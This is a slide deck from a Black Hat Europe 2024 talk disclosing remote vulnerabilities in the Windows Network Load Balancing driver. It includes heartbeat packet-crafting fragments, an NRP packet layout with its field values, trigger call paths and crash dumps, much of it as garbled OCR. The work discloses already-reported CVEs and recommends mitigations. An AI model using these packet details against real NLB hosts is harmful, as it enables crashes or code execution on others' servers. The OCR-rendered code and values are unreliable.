---
title: "Heartbeat Havoc Unveiling Remote Vulnerabilities in Windows Network Load Balancing"
speakers: ["b2ahex", "Yifen Ma", "Greenbamboo C", "Haotian Jiang"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2024"
edition: "Europe"
year: 2024
source_pdf: "BlackHat_Europe_2024_slides/b2ahex & Yifen Ma & Greenbamboo C & Haotian Jiang_Heartbeat Havoc Unveiling Remote Vulnerabilities in Windows Network Load Balancing.pdf"
pages: 39
sha256: "a03fb28203b682af1a4b23409856d31a72da9c4543cc42bdd4394b6396227fe3"
text_chars: 22956
ocr_pages: 15
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:48:28Z"
---
# Heartbeat Havoc Unveiling Remote Vulnerabilities in Windows Network Load Balancing

**Speakers:** b2ahex, Yifen Ma, Greenbamboo C, Haotian Jiang  
**Conference:** Black Hat Europe 2024  
**Source:** `BlackHat_Europe_2024_slides/b2ahex & Yifen Ma & Greenbamboo C & Haotian Jiang_Heartbeat Havoc Unveiling Remote Vulnerabilities in Windows Network Load Balancing.pdf` (39 pages)


## Slide 1

### Heartbeat Havoc: Unveiling Remote Vulnerabilities in Windows Network Load Balancing

RyeLv(@b2ahex), Greenbamboo, Yifen Ma, Haotian Jiang

#BHEU @BlackHatEvents

## Slide 2

## Agenda

⚫ Background

○ What is Network Load Balancing(NLB)

- NLB Modules

○ Heartbeat Mechanism

⚫ Case Studies

- Out-of-bounds R&W by Evil HostID

- Integer overflow in TLV_HEADER

- Race condition to UAF in NLBIPList

- Race condition to DoS by NRProtocol

○ Moderate Severity but Unauth DoS

⚫ Conclusion

○ Summary of Findings

○ Mitigation Strategies ○ Takeaways

Information Classification: General

#BHEU @BlackHatEvents

## Slide 3

# Background

#BHEU @BlackHatEvents

## Slide 4

## What is NLB?

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
biSekhat What is NLB?
EUROPE 2024
pone WLB Host
' Client |
; virtual IF
Dedicated IP
! nee NLB virtual IP NLB Host
| Client |
I Request
| ; = => virtual IP
| ! NetWork we Dedicated IP
| ~~
| Client | ~~ vee
! } we NLB Host
\ eee _ yi virtual IF
Dedicated IP
Information Classification: General 1
```

## Slide 5

## NLB Modules

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseakhat NLB Modules
EUROPE 2024
Cluster host
Server application nlbmgr.exe
Ov5erating system kernel
Network loading Balancing driver Grlb.sys)
!
" a Network Load Balancing Manager _
hte es Network adapter driver Network adapter driver
EY (192.160.40.11)] ee el
3° °
ce Network adapterver a Network adapter
[) nlb.exe
nib.sys ; °
\ > nibefg.dil t t ra
@ nibmgr.exe t o
nlbmprov.dil t t a
Information Classification: General
```

## Slide 6

## Heartbeat Mechanism

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
biSekhat Heartbeat Mechanism
EUROPE 2024
----------> convergence
NLB.sys
by
NLB Host M Host NLB Host
Information Classification: General 1
```

## Slide 7

## Heartbeat Mechanism

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
blackhat Heartbeat Mechanism
EUROPE 2024
NLB heartbeat packet processing flow
NLBCoreReceivePacket
NLBCoreReceiveHeartbeat
ID : @xC@DEO1BF ID : @xC@DE@1DE
ID: @xC@DE@1CO
NLBCoreReceiveMembershipHeartbeat NLBCoreReceiveIdentityHeartbeat NLBCoreReceiveNRProtocolData
Convergence | | NLBIPList IdentityCache
Information Classification: General
```

## Slide 8

# Case Studies

#BHEU @BlackHatEvents

## Slide 9

#### Case Study 1: OOB R&W by Evil HostID

```
/* Identity cache */
MAIN_IDENTITY identity_cache[32];
```

Information Classification: General

#BHEU @BlackHatEvents

## Slide 10

#### Case Study 1: OOB R&W by Evil HostID

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pikekhat Case Study 1: OOB R&W by Evil HostID
EUROPE 2024
identity_cacheLOI
ae
| ttl }
/ If ——-DIPEntrylist J
main_context / | ( \
— >» / | fadn buffer
/ identity_cacheL1I
ee | {Hestrdca) i?)
( ttl ! _
| f DIPEntrylist 4{—
| IDENTITY
identity_cachelL32] | . |
g Fadn bubRer |
— \ NN _ J)
\ eco
ilentity_cachel31]
HostIDG2) }
f ttl
( DIPEntrylist } -
Information Classification: General
```

## Slide 11

#### Case Study 1: OOB R&W by Evil HostID

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
biSekhat Case Study 1: OOB R&W by Evil HostiD
EUROPE 2024
c lust er host
Identit yHeartbeat_msq
(unsigned long*)(nlb) = @xCeDEe1Ce; Void NLBCoreReceiveldentityHeartbeat(..) <
(unsigned long*)(nlb + 4) = 0x205;
(unsigned long*)(nlb + 8) = @x22222222; 1 ¢
(unsigned long*)(nlb + 12) inet_addr("192.168.40.100") ; Do some verification of packet length and version
nlb[20] 1;
nlb[21] 2: if(DataType == 1)
nlb[22] Q; NLBCoreReceiveldentityFQDNPayload(...) +
nlb[23] = 9; ;
nlb[24] = 9; if(DataType == 2)
nlb[25] = 9; NLBCoreReceiveldentityDIPPayload(...) +
nlb[26] = @; ;
nlb[27] = 9; logging
nlb[28] = 9; } 6
Information Classification: General
```

## Slide 12

#### Case Study 1: OOB R&W by Evil HostID

###### Trigger by NLBCoreReceiveIdentityFQDNPayload

NLBFilterReceiveNetBufferLists

- ->NLBCoreReceivePacket

- ->NLBCoreReceiveHeartbeat

- ->NLBCoreReceiveIdentityHeartbeat

- -> NLBCoreReceiveIdentityFQDNPayload

Information Classification: General

#BHEU @BlackHatEvents

## Slide 13

#### Case Study 1: OOB R&W by Evil HostID

###### Trigger by NLBCoreIdentityCacheAddDIPEntry

Information Classification: General

#BHEU @BlackHatEvents

## Slide 14

#### Case Study 1: OOB R&W by Evil HostID

###### Trigger by NLBCoreIdentityCacheGetDIPEntry

Information Classification: General

#BHEU @BlackHatEvents

## Slide 15

#### Case Study 1: OOB R&W by Evil HostID

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseichat
EUROPE 2024
Case Study 1: OOB R&W by Evil HostiD
iopl=0
cs=0010
FFF£803° 45bb0c40
Resetting default
PROCESS_NAME:
STACK_TEXT:
+44fae81° d70845f8
ffffae81° d7084600
f£#£ae81° d7084710
£££fae81" d7084760
ffffae8l d76847c0
f£fae81" d7084820
iff ffae81° d7084860
if fffae81" d76848e0
lf fffae81° d7084949
if fffae81° d7084980
ffed
scope
F£FF4803° 45ba7276
FFFFF803° 45ba6cel
F£FF803° 45baScf2
#££¥803° 45ba5992
ffffF803° 448dalf5
F££FF803° 44e1000c
ff fF F803 44df84be
fff ff803° 448d8507
ffffF803° 44dfa507
FFfFF803° 44df9b89
jmp
111+0000000000000800 r12-0000000010000004 r13=ffffb38b6e457010
r14=ffffb38b6ef38090 ri5=ffffb38b6e457750
nv up ei pl nz ac pe cy
$$=0018 ds=002b es=002b fs=0053 gs=002b
FLTMGR! guard_dispatch_icall_ nop:
ef l=
rax {41414141 41414141}
: Ffffb38b°
: ffffaes1”
: **ffae81°
: FFFFTFFF
: ffffb38b"
: Ffffb38b"
: ffffb38b~
: 80000000"
: 98000000"
: 00000275
6e457750
d70847e0
d7885000
fffe7960
6d6ac@30
6fbad196
6b9f2380
80000000
90000001
3ad0c8cO
99080000"
80000000"
#fffae81"
00000000"
ffffb38b"
f£ffb38b"
fff fb38b”
00000000"
99000080"
00000000"
00050213
ee8eee00
00001062
d707f000
09000000
6fbad190
6d586b80
6fbad160
00000000
90000001
0000018¢
#¥¥¥b38b° 6eF38010
fff fb38b° Gefd1aee
ffffae81° d70847e0
00000000" 88000000
08800000 6d6993800
80088008 B0Ee8e00
fff fb38b° 6fbad16e
ffffae81° d7084a49
99000000 00000001
00800000 20008608
90000800"
fff fb38b™
ffffaes1-
FFF fb38b™
90200000"
fff fb38b"
ffffaes1
ffffb38b"
fff fb38b
00000800"
89000880 :
6d699800 :
d70847f@ :
6d699840 :
88000000 :
6fbad190
d7084a49 :
6fbad190 :
6fbad190
FLTMGR! guard_dispatch_icall_nop
FLTMGR! FltpPerformPreCal lbacksWorker+0x32a6
FLIMGR!FltpPassThroughInternal+@xd1
FLTMGR! FltpPassThrough+0x172
FLTMGR! FltpDispatch+@x142
: nt! IofCallDriver+0x65
nt! TopDeleteFile+0x13¢
nt! ObpRemoveObjectRoutine+Ox7e
: ntlobfDereferenceObjectWithTag+Oxc7
00000000 :
nt !ObpC loseHandle+0x327
Information Classification: General
```

## Slide 16

#### Case Study 1: OOB R&W by Evil HostID

**Security Checks Removed:  From WLBS to NLB**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 17

#### Case Study 2: Integer overflow in TLV_HEADER

**v10 = 8 * (pTLV->length8) - 10**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 18

#### Case Study 2: Integer overflow in TLV_HEADER

###### **0xffff99010fd4560a + 0x54 = 0xffff9901`0fd4565e**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 19

#### Case Study 2: Integer overflow in TLV_HEADER

###### **0xffff99010fd4560a + 0x54 = 0xffff9901`0fd4565e**

**16 bytes**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 20

###### Case Study 3: Race condition to UAF in NLBIPList management

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
» a
2)
blackhat Case Study 3: Race condition to UAF in NLBIPList management =
EUROPE 2024
NLBCoreLOControlQueryFi Iter
NLBIPListCheckItem
ee N l RIPList
d resource address
A. get the share >
if (pNLBIPList->Items && pNLBIPList->HashTable
Items array
Some code to retrieve the BitVector No Lock!
for ( i = HashTable[v14 % @x1F7]; ; ++i access the array
BitVector array
f (Items[ xxx type_ip )
HashTable array
Information Classification: General
```

## Slide 21

###### Case Study 3: Race condition to UAF in NLBIPList management

- NLBFilterReceiveNetBufferLists

   - ->NLBCoreReceivePacket

   - ->NLBCoreReceiveHeartbeat

   - ->NLBCoreReceiveIdentityHeartbeat

   - ->NLBCoreReceiveIdentityDIPPayload

   - ->NLBIPListAddItemEx

   - ->NLBIPListIncreaseSize

Information Classification: General

#BHEU @BlackHatEvents

## Slide 22

###### Case Study 3: Race condition to UAF in NLBIPList management

- NLBCoreIOControlQueryFilter ->NLBIPListCheckItem

   - ->NLBIPListCheckItemIndex

Information Classification: General

#BHEU @BlackHatEvents

## Slide 23

##### Case Study 4: Race condition to DoS by NRProtocol

NLBFilterReceiveNetBufferLists

- ->NLBCoreReceivePacket

   - ->NLBCoreReceiveHeartbeat

- ->NLBCoreReceiveMembershipHeartbeat

->NLBCoreLoadProcessHeartbeat

Information Classification: General

#BHEU @BlackHatEvents

## Slide 24

##### Case Study 4: Race condition to DoS by NRProtocol

thread 1: NLBCoreLoadProcessHeartbeat

thread 2: NLBCoreIOControlReload or  NLBApeDeInitializeCoreLoad

Information Classification: General

#BHEU @BlackHatEvents

## Slide 25

##### Case Study 4: Race condition to DoS by NRProtocol

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Qa | :
blackhat Case Study 4: Race condition to DoS by NRProtocol :
EUROPE 2024
Raw args Funcinfo Source Addrs Headings Nonvolatile regs Frame nums Sa
nt |! KeBugCheckEx
nt! KiBugCheckDispatch+0x69
nt!KiPageFault+0=485 / "
nt! KeAcquireSpinLockAtDpcLevel+0xd - \ }
NLB! NLBCoreNRProtocolStartSending+0x73
NLB! NLBCoreLoadProcessHeartbeat+0xf 89
NLB! NLBCoreReceiveMembershipHeartbeat+0x1lfb
NLB! NLBCoreReceiveHeart beat+0x375
NLB! NLBCoreReceivePacket+0x14b
NLB!NLBFilterReceiveNet Buf ferLists+0x257
NDIS!ndisCallReceiveHandler+0xb9 ; inté4 — fastcall NLBCoreNRProtocolStartSendi int64 al, _ int64 a2, int
NDIS!ndisCallNextDatapathHandler<2,void * _ptr64 & __ptr64.v F
NDIS!ndisIterativeDPInvokeHandlerOnTracker<2,void __cdecl(voi
NDIS!ndisInvokelIterativeDatapath<2,void _ cdecl(void * __ptré
NDIS! ndisInvokeNext ReceiveHandler+0xa6
NDIS! NdisMIndicateReceiveNetBuf ferLists+0x116
e@1168x64! RECEIVE: :RxIndicateNBLs+0x133
21168x64!RECEIVE: :RxProcessInterrupts+0x1f3
CUSTOMER_CRASH_COUNT 1
PROCESS_NAME: System
TRAP_FRAME f£££££8007d9937d0 —— ( trap Oxfffff£8007d9937d6
NOTE: The trap frame does not contain all registers
Some register values may be zeroed or incorrect
rax=0000000000000000 rbx=0000000000000000 rex=0000000000000068
rdx=fff£f££9007d993b58 rsi=0000000000000000 rdi=0000000000000000
rip=ffff££8007dfa8d2d rep=fffff£8007d993960 rbp=0000000000000001
r8=O000000000000001 r3=fffff8007d993901 r1lO=fffff8007d£a8d20
ril=fff£££8007d9939b0 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r1S=0000000000000000
iopl=0 nv up ei pl zr na po nc
nt ! KeAcquireSpinLockAtDpcLevel+0xd:
fffff800° 7dfa8d2d £0480fba2900 lock bts qword ptr [rex].0 ds: 00000000° 00000068=?777727727272272727222?
Resetting default scope
STACK_TEXT
fFFFFANN 7ADSABAR FFFFFRANN’ 7e19Aad79 nnnnnann AnAnAnha ANnANANnAN nAnnnnsa AnAnAnAn AnnAnnAn? nAAnAnnAnn* annnnanni nt. | KeRuaCheckFEx
Information Classification: General
```

## Slide 26

##### Case Study 5: Moderate Severity but Unauth DoS

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
NLB Host
NLB Host
NRProtocol
V
Call Stack:
NLBCoreReceivePacket
->NLBCoreReceiveHeartbeat
->NLBCoreReceiveNRProtocolData
->NLBCoreLoadReceiveNRProtocolData
->NLBCoreNRProtocolReceiveData
int v5; //
unsigned int v7; //
unsigned int v8; //
unsigned int v9; // ré
unsigned int awalys_1; //
int64 v12; //
DWORD *)(al + @x2@);
DWORD *)(al + @x1@);
- *(_DWORD *)(al + @x18)) / v8;
)
return 0164;
if ( (*(_DWORD *)(
goto LABEL_7;
@
(
!
if
~u nnd
+ 0x28) - d/ >= )// Expansion check: calculate
Jhether the currently available space is sufficient
if ( {3+ > ad) Expansion expansion
= 13+ v9;
= NLBVectorReserve(al, + awalys_1);
if (! )
{
LABEL_7:
= *(_DWORD *)(al + 16) * a3;
memmove(*(void **)(a1 + 32), a2, (unsigned int)v12);
*( QWORD *)(al + 32) += v12;
}
strategy: at least 1/3
return >
->NLBCoreNRProtocolReceivelPv4(IPv6)Add
->NLBVectorPushBack
->NLBVectorReserve
Information Classification: General
```

## Slide 27

##### Case Study 5: Moderate Severity but Unauth DoS

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
t64 fast NLBVectorReserve(_int64 tor, int N )
UINT NewSize; // e
unsigned int v3; //
53 //
size_t v6; //
NLB Host NLB Host __int64 v7; //
—- t64 v9[2]; //
——— int v10; // 3
int vil; // [rsp+3
NRProtocol r*v125 //
char *v13; //
int64 v14; // +
PVOID VirtualAddress; // [ ll 10h] BYR
= *(_DWORD *)(vector + @x1@) * t;// Vector->ElementSize * NewCount
3 = 8;
1 if ( *(_DWORD *)( + 0x28) - *(_DWORD *)( + 0x18) < )
{
wee tua ess = @164;
i] (&Vi > » ' BLN');// Memory will not be released
y if ( 1v3 )
Call Stack: PaG t wold "(vector 28
NLBCoreReceivePacket = (inca ire css +
->NLBCoreReceiveHeartbeat [0] = (soso ,
->NLBCoreReceiveNRProtocolData W293 (chan *Wintualaddresss
->NLBCoreLoadReceiveNRProtocolData { - (en)
->NLBCoreNRProtocolReceiveData » se
->NLBCoreNRProtocolReceivelIPv4(IPv6)Add « = (unsigned int)(*(_DWORD *)(vector + 32) - ( pwoRD¥S);
->NLBVectorPushBack wnmoet gned int)v65 ); :
->NLBVectorReserve ; = &v12[v7];
NLBVectorSwap( » V9)5
}
}
Information Classification: General
```

## Slide 28

##### Case Study 5: Moderate Severity but Unauth DoS

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat Case Study 5: Moderate Severity but Unauth DoS .
EUROPE 2024
NLB Host
& Attacker
eee em ee ee ee ee ee ew we we eee eee ee eee eee DS
NRPPacket
#pragma pack(push, 1)
typedef struct _NRP_PACKET
t
!
!
!
unsigned long Magic;
unsigned char Funcld; \
unsigned long unk1;
unsigned char Type; f
unsigned char Index; J
unsigned char TestBit; ,
unsigned short unk2; |
unsigned long ExtendLen;
}NRP_PACKET , *PNRP_PACKET; \
#pragma pack(pop)
J
Information Classification: General
```

## Slide 29

##### Case Study 5: Moderate Severity but Unauth DoS

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat Case Study 5: Moderate Severity but Unauth DoS
EUROPE 2024
NLB Host
& Attacker
_—
[~ WN nee eee
— NRPPacket
#pragma pack(push, 1) ©
typedef struct _NRP_PACKET
{ =_ =
unsigned long Magic;
junsi ned_char FunclId
unsigned long unk1i;
unsigned char Type; eiveldentityHeartbeat
unsigned char lestbit;
unsigned short unk2; NLBCoreRec
unsigned long ExtendLen;
FNRP_PACKET , ¥PNRP_PACKET ;
#pragma pack(pop)
NLBCoreReceiveMembe
Magi
NLBCoreNRProtocolReceiveAck(al, 18,
oreNRProtocolReceivelPv4Add(al,
NLBCoreNRProtocolReceiveIPv4Remove(al,
T)&WPP_GLOBAL_Control HIDWORD(WPP_GLOBAL_Control
Information Classification: General
```

## Slide 30

##### Case Study 5: Moderate Severity but Unauth DoS

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
NLB Host
eee ee ee em ee ee ee ee we eee ee eee eee eee - DS
- ~
ak NRPPacket
'
i#pragma pack(push,1)
itypedef struct _NRP_PACKET
unsigned long ExtendLen; //+@xe The length of the following part has different meanings depending on the FunclId
NRP_PACKET , *PNRP_PACKET ;
}
| #pragma pack(pop) DE ee ape rset Re ea cr pete Ra cs ea as ys ca a Ricci crc nn gat ae ead open ey ea ome pF
'
|
1
'
I
i}
'
'
'
unsigned char Type; //+®x9 Fixed to 2, otherwise calling NLBCoreExceptionListGetBucketOwnership will fail
!
1
1
'
|
}
!
!
'
|
unsigned long Magic; //+@x® Fixed to @xBEEF
1 unsigned char FuncId; //+@x4 1 -- Ack 2 -- IPv4Add 3 -- IPv4Remove 4 -- IPv6Add 5 -- IPv6Remove
| unsigned long unk1; //+x5
'
; unsigned char Index; //+@xa HostID,less than 32,The size of each element in the array corresponding to this subscript value is Qx5E@,
;see NLBCoreExceptionListGetBucketOwnership
' unsigned char TestBit; //+Oxb
unsigned short unk2; //+Oxc
1
I
I
|
Information Classification: General
```

## Slide 31

##### Case Study 5: Moderate Severity but Unauth DoS

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
EUROPE 2024
Case Study 5: Moderate Severity but Unauth DoS
kd> p
LBINLBVectorReserve+0x2d:
IF FFFF803° 92563439 Of8389000000
kd> p
LB!INLBVectorReserve+0x33:
If fFFF803° 9a56343F 48217510
kd> p
LBINLBVectorReserve+0x37:
If fFFF803° 9a563443 488d4d10
I kd> p
LB!INLBVectorReserve+0x3b:
IF fFFF803° 92563447 41b84e4c4220
kd> p
LB!INLBVectorReserve+0x41:
if FF4F803° 9a56344d 8bd3
kd> p
LBINLBVectorReserve+0x43:
If fFFF803° 9a56344F 48fFf156acc0000
kd> p
LB! NLBVectorReserve+0x4a:
If fF FF803° 92563456 Of1F449000
kd> r rax
ax=00000000c0000001
kd> g
reakpoint @ hit
LB!NLBVectorReserve+0x4a:
ffFf803° 9a563456 Of1f449000
a: kd> r rax
'ax=00000000c0000001
a: kd> g
[SC-CLIENT] !! Service timeout: Service StorSvc, PID 0x00000410, OpCode 0x0e000010, pel
jae
and
lea
mov
mov
call
nop
nop
NLB!INLBVectorReserve+Oxbc (fffff803> 9a5634c8)
qword ptr [rbp+10h],rsi
rex, [rbp+10h]
r8d,20424C4Eh
edx,ebx
qword ptr [NLB!_imp NdisAllocateMemoryWithTag]
dword ptr [rax+rax]
dword ptr [rax+rax]
[SC-CLIENT] !! Service timeout: Service wemsvc, PID 0x00000718, OpCode @x00000010, Time
[eusy* Debuggee not_connected
Information Classification: General
Your device ran i a problem and needs to restart. We're
just collecting some error info, and then we'll restart for you
For more informat
fixes, visit https
you call a support person, give them this info
WHEA UNCORRE
TABLE ERROR
IBLACKBOXNTFS: 1 (\b
IBLACKBOXPNP: 1 (
IBLACKBOXWINLOGON: 1
CUSTOMER_CRASH_COUNT
PROCESS_NAME: System
STACK_TEXT
f£ff££80S° O8ac2dds fffff£80S°0967baf1 00000000°00000124 00000000° 00000010 f£f£fd101‘ec729028 ffffd101 ef352cSc : nt! KeBugCheckEx
f££££80S' OB8ac2ded f££f£805°0967c623 f£££d101 edbScf90 f££f£d101 edbSc£90 f£ffd101'ef352c30 ffff£805°00000002 : nt!WheaReportHwError+0x381
ffff£805°O8ac2eb0 ffff£80S°0967c745 00000000°00000000 00000000°000000ba ffffd101°edbScf£90 00000000°00000000 : nt!WheaHwErrorReportSubmitDeviceDriver+0xf3
ffff£80S° O8ac2eed fffff80S* Ob4S3ef3 fff£££805°08ac3120 fffff80S°08ac3120 f£ffd101°f1a58050 00000000°00000001 : nt! WheaReportFatalHvErrorDeviceDriverEx+0xf5
f£ff££80S' O8ac2£40 EFEEEBOS Ob4dcdde 00000000 00000000 00000000° 00000000 ffffd101'f1a581a0 00000000°00000000 : storport !StorpWheaReportError+0xb3
ff££££805° O8ac2fd0 ff£f£80S* Ob42ceee 00000000° 00000000 00000000° 00000000 00000000°00000000 00000000°00000000 : storport !StorpMarkDeviceFailed+0x3ff
ffff££805°08ac3280 Ffftf80S° ObSS013a ffffd101°f1a53010 f£f£fd101°£1a53010 00000000°00000000 00000000°00000000 : storport !StorPortNotification+0xlfeae
f£f££805°08ac3350 £f£ff£80S ObSSfIec 00000000° 00000000 00000000° 00000000 ff£f£80S'08ac3600 00000000'00000000 : stornvne!NVMeControllerInitPart1+0x236
ff£f££805°08ac3450 ff£ff£80S* ObSSOfes ffffd101°f1853010 ffffd101°f1aS81a0 f£ff£805°08ac3600 ffffd101°f1eS81a0 : stornvme!NV¥MeControllerReinitialize+0x34
ffff£805°08ac3480 £fff£805° ObS4a93£ ffffd101°f1a581a0 ffffd101°f1a53010 f£fff£805°O8ac36b0 ffffd101°f1a581a0 : stornvme!NVMeControllerReset+0x152
f££££805°08ac3S80 FfEf£B0S Ob4393£1 f£ff£d101°flaSdla0 00000004 cb847cce f£fff805' 08acd000 Ffff£80S°Ob41512a : stornvme! NVMeHwResetBus+0x1f
ffff£805°O8ac3Sb0 fffff£80S* Ob466cd8 ffffd101°flaSdia0 00000000°00000004 f£ffd101°flaSd1a0 00000000°00000004 : storport !RaidAdapterResetBus+0x19d
ff£f££805°08ac3710 fffff£80S* Ob42d75a f£f£££805° O8ac3b10 00000000° 00000004 f£ffd101°ed0S7000 ffff£80S°6a734c0f : storport !RaidUnitAbortHierarchicalReset VorkI tem+0x108
f££££80S°08ac37b0 £f£f£80S°092ee311 f££££805°08ac3919 ££EE£B0S~08ac3908 00000000°00000003 00000000°00000000 : storport !RaidUnitPendingDpcRout ine+0xlfela
f£f££805°08ac3850 fffff805° 092eb890 00000000°00000000 00000000°00000000 00000000'00000000 00000000'000000E9 : nt!KiProcessExpiredTinerList+0x151
f£ff££805°08ac3980 Fffff£80S°09462d3e 00000000° 00000000 f££f£805°07190180 00000000'001a7550 f£f£f80S°09fb6700 : nt!KiRetireDpcList+0x580
f£f£££805°08ac3e40 00000000° 00000000 f££fEB0S OBacdO00 FFEELBOS OBabe000 00000000°00000000 00000000°00000000 : nt!KiIdleLoop+0x3e
```

## Slide 32

# Conclusion

#BHEU @BlackHatEvents

## Slide 33

## Summary of Findings

**1.** Exploits arbitrary HostID manipulation to trigger out-of-bounds read and write, enabling unauthorized arbitrary code execution.

**2.** Carefully crafted TLV headers can cause integer overflow, which can lead to out-ofbounds reads.

**3.** A race condition that triggers Use-After-Free in NLBIPList, potentially allowing arbitrary code execution.

**4.** Exploiting a race condition in NRProtocol to induce a Denial of Service, compromising NLB service stability.

**5.** Though of moderate severity, this vulnerability can be exploited remotely without authentication, compromising NLB service stability.

In fact, we submitted 9 NLB service-related vulnerabilities to MSRC, which were eventually merged into 2 CVEs:

CVE-2023-28240 and CVE-2023-33163

Information Classification: General

#BHEU @BlackHatEvents

## Slide 34

## Mitigation Strategies

- Prompt fixes are highly recommended.

- Some Moderate Severity vulnerabilities may take longer to fix. It is recommended to pay attention to abnormal frequency of NLB heartbeat protocol packets.

- Add firewall policy to block hosts other than nlb host from sending heartbeat protocol to nlb host

Information Classification: General

#BHEU @BlackHatEvents

## Slide 35

## Takeaways

###### 1. Monitoring NLB Heartbeat Traffic

It's crucial for security teams, especially those in organizations utilizing the Network Load Balancing (NLB) service, to pay special attention to NLB heartbeat traffic. Heartbeats are fundamental for maintaining cluster synchronization and health monitoring. However, as we've demonstrated, these packets can also be manipulated to exploit vulnerabilities, potentially leading to serious security issues. Regularly inspecting and analyzing this type of traffic could help detect unusual patterns or signs of exploitation early on, reducing the risk of attacks targeting NLB components.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 36

## Takeaways

###### 2. Risks in Code Refactoring

There's an inherent risk when refactoring legacy code. In many cases, security checks implemented in older versions might be inadvertently omitted or altered during updates by developers. This can introduce new vulnerabilities even in areas that were previously secure. Therefore, rigorous security audits and thorough testing should be part of the development process, especially when dealing with critical components like NLB, to ensure that previously fixed issues do not resurface.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 37

## Takeaways

###### 3. Underestimated Vulnerability Impact

While some vendors may classify certain vulnerabilities as 'medium severity,' leading to longer patch timelines or even a lack of resolution, these issues shouldn't be underestimated. Even mediumrated vulnerabilities can impact the stability and security of the server environment if exploited under specific conditions. It's important to understand that these risks might not always seem urgent but can have severe consequences if left unaddressed, especially in production environments where system uptime and reliability are paramount.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 38

## Takeaways

###### 4. Opportunities for Bug Bounty Hunters

Refactored modules can be valuable targets for bug bounty hunters. They might reproduce old bugs or reveal new attack surfaces. Moreover, the abundance of technical articles and related source codes often makes it easier for security researchers to analyze and identify potential vulnerabilities in these areas.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 39

# Thanks!

#BHEU @BlackHatEvents
